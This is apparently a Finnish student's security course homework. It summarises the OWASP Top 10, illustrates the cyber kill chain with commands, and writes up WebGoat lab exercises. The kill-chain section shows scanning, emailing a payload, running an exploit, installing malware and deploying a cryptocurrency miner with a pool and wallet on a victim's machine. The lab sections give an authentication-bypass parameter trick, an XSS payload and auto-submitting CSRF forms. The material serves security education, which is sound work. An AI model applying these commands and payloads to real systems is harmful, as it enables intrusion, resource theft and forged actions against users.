
# H2


# Tehtävä A
# OWASP 10
**1.Injektio**
-Injektiossa lähetetän vaarallista dataa kääntäjään, jolloin voidaan saada luettavaksi dataa, jonka kuuluisi olla salattua. Dataa voidaan myös poistaa, korruptoida ja luovuttaa väärille tahoille.
-Injektio voidaan estää syötettävän datan filtteröinnällä ja validoinnilla. API:t ja ORM-kehykset voivat tehdä tämän.
-Jos parametreja hyväksytään syöttönä, niin injektion vaara on suuri.

**2.Rikkinäinen autentikaatio**
-Hyökkääjät voivat tunnistaa rikkinäisen autentikaation manuaalisesti tai työkaluilla (esim. sanakirjahyökkäys ja salasanalista)
-Vain yksi murrettu salasana voi vaarantaa koko järjestelmän ja tuottaa suuria taloudellisia vahinkoja yritykselle tai yksityishenkilölle
-Monivaiheinen autentikoiti on hyvä työkalu salasanojen varastamista vastaan
-Salasanojen palauttamisen tulee olla tarpeeksi vaikeaa, että sitä ei voi käyttää hyödyksi

**3.Arkaluontoisen datan paljastuminen**
-Tässä arkaluontoiseen dataan päästään käsiksi. Yleisiä keinoja ovat man-in-the-middle hyökkäykset ja salaamattoman datan varastus suoraan serveriltä.
-Datan ja yhteyksien salaamattomuus on iso varkauden mahdollistaja
-Arkaluontoista dataa ei kannata tallentaa, jos ei ole pakko. Dataa mitä ei ole ei voi varastaa

**4.XML:än ulkoiset tekijät**
-XML prosessoreita voi hyväksikäyttää jos niille saa ladattua XML:ää tai sitä sisältävän dokumentin.
-Aplikaatiot jotka hyväksyvät suoraan XML:ää tai XML latauksia luottamattomista löhteistä ovat suuri riski
-Näillä hyökkäyksillä yritetään yleensä varastaa dataa, rajoittaa pavelun saatavuutta ja käyttää järjestelmä väärin.
-Ohjelmistokehittäjien kouluttaminen XXE vaaroja vastaan on hyvä tapa vähentää haavoittuvien ohjelmien luomista.

**5.Rikkinäinen pääsynvalvonta**
-Pääsynvalvonnan heikkoudet johtuvat usein automatisoidun havaitsemisen puutteesta tai aplikaatioiden testauksen puutteesta
-Oikeuksien rajoittaminen on hyvä tapa ehkäistä rikkinäistä pääsynvalvontaa
-Pääsynvalvonta tulee suorittaa palvelinpuolelta ja deny by default toimii hyvänä ohjenuorana

**6.Turvallisuuden huono määrittely**
-Tällöin turva-asetukset ovat huonot tai ne on jätetty oletusasetuksille ja niitä pystyy hyödyntämään
-Oletuskäyttäjien poisto on tärkeää, koska niitä hyödyntämällä hyökkääjä voi päästä järjestelmän sisälle.
-Käyttämättömien ominaisuuksien ja turhien ominaisuuksien lisääminen vaarantaa järjestelmää ilman syytä. Minimi on aina paras määrä tietoturvan kannalta
-Viat määrittelyissä antaa hyökkääjille oven järjestelmään ja sen hallintaan

**7.Cross-site scripting**
-Hyökkääjät pystyvät hyödyntämään automatisoituja työkaluja, jotka havaitsevat ja käyttävät hyväksi kaikkia kolmea exploittia
-Kolme XSS muotoa ovat Reflected XSS, Stored XSS ja DOM XSS
-Jopa 2/3 osaa applikaatioista ovat haavoittuvaisia XXS:lle
-Selaimessa suoritettavat skriptit voivat kaapata sessioita tai tehdä haitallisia uudelleenohjauksia
-Kehykset, jotka poistuvat automattisesti XXS:stä auttavat

**8.Turvaton deserialisaatio**
-Vaikea hyödyntää ja vaatii taitoa
-Tässä käännetään tavujonoja objektiksi
-Paras tapa ehkäistä tätä on estää kaikki epäluotettavista lähteistä peräisin olevat objektit
-Aplikaatiot ovat haavoittuvaisia, jos ne deserialisoivat haitallisia objekteja

**9.Haavoittuvaisten komponenttien käyttö**
-Haavoittuvaiseksi todettujen komponenttien hyödyntämistä
-Pakettien päivittäminen ja ajan tasalla pito on hyvä estämään näitä hyökkäyksiä
-Tunnetut haavoittuvuudet ovat kaikkien hyväksikäytettävänä, sillä ne ovat yleisesti tiedossa. Niitä varten on kirjoitettu haittaohjelmia, jotka usein ovat yleisessä jaossa.
-Jos haavoittuvaisuuksia ei skannata tasaisesti, niin ne voivat aiheuttaa isoja taloudellisia ongelmia

**10.Riittämätön lokitietojen keräys ja valvonta**
-Jos järjestelmän lokitietoja ei valvota tai kerätä, niin järjestelmän käytöstä ja väärinkäytöstä ei saada tarkkaa kuvaa
-Tätä käytetään hyväksi melkein kaikissa isoissa tietomurroissa
-Lokitiedoista pystyy valvomaan, että kaikki toimii tarkoituksenmukaisesti ja kaikki mahdolliset virheet pystytään dokumentoimaan ja korjaamaan.

[Lähde1](https://attack.mitre.org/) [Lähde2](https://github.com/OWASP/Top10/raw/master/2017/OWASP%20Top%2010-2017%20(en).pdf)

# Tehtävä B

**Vaihe 1: Tiedustelu**
Tiedustelun voi suorittaa vaikka skannaamalla portteja. nmap on tähän hyvä ohjelma

```
$ sudo nmap -sC -sV recon IP**** -v
```
Tämä komento skannaa kohde IP-osoitteen portit ja kertoo mitkä niistä ovat auki ja mikä ohjelma/palvelu niitä käyttää. Tiedot tallentuvat "recon" nimiseen tiedostoon.

**Vaihe 2: Aseistaminen**

Tässä vaiheessa valmistaudutaan hyökkäykseen. Haittaohjelman ja hyökkäystavan valinta tulee tehdä tiedustelusta saatujen tietojen perustein. Sarchsploit on tähän vaiheeseen hyvä työkalu. Tässä searchsploit etsii exploit databasesta apachen haavoittuvuuksia:
```
$ searchslpoit apache
```

**Vaihe 3: Kuljetus**

Tässä vaiheessa haittallinen payload kuljetetaan kohteeseen emailin, webin tai muun dataa kuljettavan protokollan kautta. Debianissa on mailutils jonka avulla voidaan lähettää sähköposti suoraan komentoriviltä, mutta senkin voi tehdä
```
$ mpack -s "aihe" file kohde@example.com
```
**Vaihe 4: Hyväksikäyttö**

Tässä vaiheessa haavoittuvuutta hyödynnetään ja uhrin järjestelmässä ajetaan haitallista koodia. Tässä hyödynnetään tiedustelusta saatua tietoa ja koodi on yhteensopiva jonkun kohteen haavoittuvuuden kanssa. Tässä koodi laitetaan pyörimään, joten esimerkkinä käytän
```
$ python /home/desktop/exploit/koodi.py http://IP:Portti/
```

**Vaihe 5: Asennus**

Tässä vaiheessa asennetaan onnistuneen hyökkäyksen kohteen järjestelmään kaikki tavittavat haittaohjelmat

```
$ git clone https://github.com/haittaohjelma
```

**Vaihe 6: Komenna ja hallitse**

Nyt uhrin järjestelmä on kontrolloitavana etänä. Esimerkkinä voi olla pelkkä kirjautuminen urhin koneeseen kun takaovi on asennettu. Esimerkkinä käytän pelkkää ssh kirjautumista
```
$ ssh username@IP:port
```

**Vaihe 7: Toiminta kohteessa**

Tee haluamasi pahanteko uhrin järjestelmällä ja louhi vaikka kryptovaluuttaa
```
$ git clone https://github.com/tpruvot/cpuminer-multi
$ sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
$ ./buildsh
$#!/bin/bash
./cpuminer -a sha256d -o stratum+tcp://connect.pool.bitcoin.com:3333 -u 1HmfbfGHey2oTExiQwHag16N1tb8ATSeYv -p c=BTC
$chmod +x run.sh
```

[Lähde3](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)

# Tehtävä C
# A2 Authentintication bypasses

Aloitin tehtävän tutkimalla lähdekoodia. Etsin elementit, joissa on tekstiboxit ja poistin ne.
Kun tämä ei toiminut päätin ottaa proxyn käyttöön, jossa käytän burppia. Burpissa ilmeentyi ongelmia koska se ei kuunnellut localhost osotteita. Ratkaisuksi latasin foxyproxy lisäosan firefoxiin, johon lisäsin "localhost:8080" osoitteen.
Tämän jälkeen burp pystyi nauhoittamaan webgoatin pyyntöjä.
Sieltä löytyi lopusta pätkä
```sh
secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid 
```
Aluksi koitin poistaa seqQuestionit, mutta tämä ei toiminut forwardin jälkeen.
Ratkaisuna toimi kun vaihdoin sequestioneiden numerot 3 ja 4, jonka jälkeen autentikaatio oli ohitettu.

```sh
secQuestion3=&secQuestion4=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid 
```
Oli siis tehtävän ratkaisu

# A2 Secure passwords

Tämä tehtävä oli helppo kun salasanasta vaan teki tarpeeksi pitkän ja monimutkaisen
Ratkaisin tehtävän hakkaamalla päätä pari kertaa näppäimistöön.


# A3 Sensitive Data Exposure

Tämäkin tehtävä ratkesi helposti burpy sovelluksella.
Interceptasin login näppäimen painon ja burpyyn printtaantui
``` {"username":"CaptainJack","password":"BlackPearl"}```

Nämä kun syötti boxeihinsa niin tehtävä oli ratkaistu.



# A7 Cross Site Scripting

**Tehtävä 2**
ohjeissa neuvotaan kirjoittamaan "javascript:alert(document.cookie)" , mutta tämä ei toiminut ja nopealla googletuksella ilmeni että selaimet eivät hyväksy javascript käskyjä URL laatikossa.
Kokeilin seuraavaksi kirjoittaa käskyn konsoliin molemmissa välilehdissä ja huomasin, että keksit olivat identtisiä
Vastaus tehtävään on siis "YES"

**Tehtävä 7**
kaappasin burpilla "purchase" näppäimen GET pyynnön, jossa pystyi helposti identifoimaan eri ostoksen määrät ja luottokorttitiedot. Halusin etsiä tehtävästä lisää tietoa löysin netistä ohjeen jossa neuvottiin kirjoittamaan luottokorttikenttään "<script>alert()</script>". Tämän jälkeen sivusto vastasi omalla viestillään. Jos saman kirjoitti Digit access code kenttään, niin sivu varoitti että yritin XSS hyökätä sivustoon.

# A8:2013 

**Tehtävä 3**
Aloitin tehtävän painamalla "submit query" , joka vei minut toiselle sivulle, josta ei saanut paljoa irti. Tutkin elementtejä


```
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="/WebGoat/csrf/basic-get-flag" enctype="application/json;charset=UTF-8">
        <input name="csrf" type="hidden" value="false">
        <input type="submit" name="submit">

    </form> 
```
    
Tämä ei vienyt pitkälle ja jatkoin lähdekoodin tutkimista ja etsin hakusanalla "flag" käskyjä, joka ei tuottanut tulosta.
Tässä tehtävässä meni niin kauan aikaa, että päädyin lunttaamaan ja en ollut lähelläkään omalla päättelylläni.
Tehtävässä pitää tehdä oma sivu, tein tämän nopeasti nanolla ja kirjoitin sen sisällöksi:
```
<html>
<body>
 <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
  <input name="csrf" value="false" type="hidden">
  <input name="submit" type="hidden" value="submit-Query">
  <input type="submit" value="Submit">
 </form>
</body>
</html>
```

Kun sivun avaa selaimella niin näkyviin tulee "submit" näppäin, jota painamalla sivu antaa oikean flag valuen, joka omassa tapauksessani oli "13633"

**Tehtävä 4**
Tämä toteutetaan melkein samalla periaatteella kun tehtävä 3. Aloitin kopioimalla submit review koodin ja liitin sen nettisivuni koodiin.´Koodiin piti tehdä muokkauksia ja lopputulokseksi tuli
``` 
<form name="attack" action="http://localhost:8080/WebGoat/csrf/review" method="POST">  
     <input type="hidden" name='reviewText' value='Auttakaa!'>  
     <input type="hidden" name='stars' value='5'>  
     <input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'>  
</form>  
<script>document.attack.submit();</script>  
```
Tämän sivun avatessa taas tarjolle tuli "submit" näppäin, jota painamalla alkuperäiselle sivulle ilmestyy arvio, jossa lukee "auttakaa!"

[Lähde4](https://learning.oreilly.com/videos/hacking-web-applications/9780135261422/9780135261422-hwap_01_06_03_00)
